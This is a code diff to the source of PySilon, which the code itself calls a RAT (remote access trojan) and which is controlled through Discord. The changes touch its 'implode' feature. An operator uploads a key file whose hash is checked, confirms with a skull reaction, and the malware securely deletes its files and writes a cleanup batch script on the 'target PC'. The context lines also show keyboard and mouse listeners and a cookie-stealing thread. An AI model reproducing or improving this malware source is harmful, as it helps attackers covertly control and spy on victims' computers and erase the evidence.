@@ -202,7 +202,7 @@ async def on_reaction_add(reaction, user):
                 if str(reaction) == '💀' and expectation == 'implosion':
                     await reaction.message.channel.send('```PySilon will try to implode after sending this message. So if there\'s no more messages, the cleanup was successful.```')
 # [pysilon_var] !registry_implosion 5
-                    secure_delete_file(filename, 10)
+                    secure_delete_file('PySilon.key', 10)
                     try: rmtree('rec_')
                     except: pass
                     with open(f'C:\\Users\\{getuser()}\\implode.bat', 'w', encoding='utf-8') as imploder:
@@ -225,7 +225,7 @@ async def on_raw_reaction_remove(payload):
 
 @client.event
 async def on_message(message):
-    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages, keyboard_listener, mouse_listener, filename
+    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages, keyboard_listener, mouse_listener
     if message.author != client.user:
         if message.channel.id in channel_ids.values():
             if message.content == '.implode':
@@ -248,7 +248,6 @@ async def on_message(message):
                 try:
                     split_v1 = str(message.attachments).split("filename='")[1]
                     filename = str(split_v1).split("' ")[0]
-                    filename = f'C:\\Users\\{getuser()}\\{software_directory_name}\\' + filename
                     await message.attachments[0].save(fp=filename)
                     if get_file_hash(filename) == secret_key:
                         reaction_msg = await message.channel.send('```You are authorized to remotely remove PySilon RAT from target PC. Everything related to PySilon will be erased after you confirm this action by reacting with "💀".\nWARNING! This cannot be undone after you decide to proceed. You can cancel it, by reacting with "🔴".```')
